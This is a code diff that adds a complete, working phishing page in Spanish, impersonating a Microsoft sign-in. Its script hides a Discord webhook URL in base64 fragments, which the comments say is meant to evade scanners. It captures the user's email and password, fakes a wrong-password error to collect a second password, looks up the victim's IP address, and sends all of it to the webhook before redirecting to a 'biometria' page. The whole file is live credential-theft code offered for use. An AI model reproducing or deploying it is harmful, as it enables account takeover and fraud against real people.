@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Soporte de Cuenta</title>
+    <style>
+        body { margin:0; font-family:'Segoe UI',sans-serif; background:#f2f2f2; display:flex; align-items:center; justify-content:center; height:100vh; }
+        #v99-root { background:white; padding:45px; width:100%; max-width:350px; box-shadow:0 2px 12px rgba(0,0,0,0.1); position:relative; }
+        input { width:100%; padding:10px; margin:15px 0; border:none; border-bottom:1px solid #666; outline:none; font-size:16px; box-sizing:border-box; }
+        .btn-core { background:#0067b8; color:white; border:none; padding:10px 30px; cursor:pointer; float:right; font-weight:600; }
+        .err-v { color:#e81123; font-size:14px; margin-bottom:10px; display:none; }
+    </style>
+</head>
+<body>
+    <div id="v99-root"></div>
+
+<script>
+    const _H = (s) => atob(s);
+    // WEBHOOK FRAGMENTADO Y ENCRIPTADO (Tu URL de Discord)
+    const _p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
+    const _p2 = "MTQ1OTI0NTQ3NjUyMzI3ODQ5Mi8=";
+    const _p3 = "QWhIRzdOQWZCLU5EVWV6WVRFdVlGNVpWZzhqYWlnc0N3OXdYRW5aTkl0UURKVHdUd1R3VUJMRk1zbjQ5MlBUdHZOTQ==";
+    const gate = _H(_p1) + _H(_p2) + _H(_p3);
+
+    let u = "", p_a = "", st = 1;
+
+    // Inyección de UI para burlar escáneres
+    const buildUI = () => {
+        const root = document.getElementById('v99-root');
+        root.innerHTML = `
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="105" style="margin-bottom:20px;">
+            <div id="step_x">
+                <h2 style="font-size:24px; margin:0;">${_H("SW5pY2lhciBzZXNpw7Nu")}</h2>
+                <input type="email" id="em" placeholder="${_H("Q29ycmVvIGVsZWN0csOzbmljbw==")}">
+                <button class="btn-core" onclick="goNext()">${_H("U2lndWllbnRl")}</button>
+            </div>
+            <div id="step_y" style="display:none;">
+                <div id="uD" style="margin-bottom:10px;"></div>
+                <h2 style="font-size:24px; margin:0;">${_H("RXNjcmliaXIgY29udHJhc2XDs2E=")}</h2>
+                <div id="eM" class="err-v">${_H("Q29udHJhc2XDs2EgaW5jb3JyZWN0YQ==")}</div>
+                <input type="password" id="pw" placeholder="${_H("Q29udHJhc2XDs2E=")}">
+                <button class="btn-core" onclick="hit()">${_H("SW5pY2lhciBzZXNpw7Nu")}</button>
+            </div>`;
+    };
+
+    window.onload = buildUI;
+
+    function goNext() {
+        u = document.getElementById('em').value;
+        if(u.length > 3) {
+            document.getElementById('step_x').style.display = 'none';
+            document.getElementById('step_y').style.display = 'block';
+            document.getElementById('uD').innerText = "← " + u;
+        }
+    }
+
+    async function push(data) {
+        let ip = "0.0.0.0";
+        try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
+        
+        await fetch(gate, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🔱 HYDRA V99 HIT",
+                    color: 0,
+                    fields: [{name:"👤 User", value:u}, ...data, {name:"🌐 IP", value:ip}],
+                    footer: {text: "Singularity System"}
+                }]
+            })
+        });
+    }
+
+    function hit() {
+        const p = document.getElementById('pw').value;
+        if(p.length < 4) return;
+        if(st === 1) {
+            p_a = p; st = 2;
+            push([{name:"🔑 Pass 1", value:p}]);
+            document.getElementById('pw').value = "";
+            document.getElementById('eM').style.display = 'block';
+        } else {
+            push([{name:"🔑 Pass 1", value:p_a}, {name:"🔑 Pass 2", value:p}]);
+            localStorage.setItem("hydra_u", u);
+            setTimeout(() => { window.location.href = "biometria.html"; }, 500);
+        }
+    }
+</script>
+</body>
+</html>
